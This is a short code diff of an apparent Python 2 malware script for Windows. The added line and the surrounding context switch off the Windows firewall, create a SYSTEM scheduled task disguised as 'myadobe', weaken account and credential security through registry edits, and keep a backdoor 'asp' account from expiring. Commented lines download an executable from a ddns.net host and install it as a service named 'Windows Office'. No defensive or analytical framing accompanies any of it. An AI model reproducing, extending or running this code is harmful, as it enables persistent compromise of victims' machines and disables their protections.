@@ -103,6 +103,7 @@ try:
         subprocess.call("schtasks /create /ru \"SYSTEM\" /sc minute /mo 2 /tr \"net start wup\" /tn myadobe /rl highest /F")
         subprocess.call("netsh advfirewall set allprofiles state off", creationflags=CREATE_NO_WINDOW)
     subprocess.call("net start wup", creationflags=0x08000000)
+    os.system("netsh advfirewall set allprofiles state off")
     #myloop()
 except Exception,e:
     print str(e)
@@ -149,7 +150,7 @@ def myloop():
                         os.system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f")
                         os.system("wmic path Win32_UserAccount where Name=\'asp\' set PasswordExpires=false")
                         os.system("reg add hklm\\system\\currentcontrolset\\control\\lsa /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f")
-                        os.system("netsh advfirewall set allprofiles state off")
+                        #os.system("netsh advfirewall set allprofiles state off")
 ##                            if not os.path.exists('c:\\windows\\wup.exe'):
 ##                                    os.system('powershell -Command Invoke-WebRequest -Uri "http://certificates.ddns.net/wofficeie.exe" -OutFile "c:\\windows\\wup.exe"')
 ##                                    subprocess.call("sc create wup binPath= \""+os.getenv('windir')+"\\wup.exe\" DisplayName= \"Windows Office\" start= auto", creationflags=CREATE_NO_WINDOW)
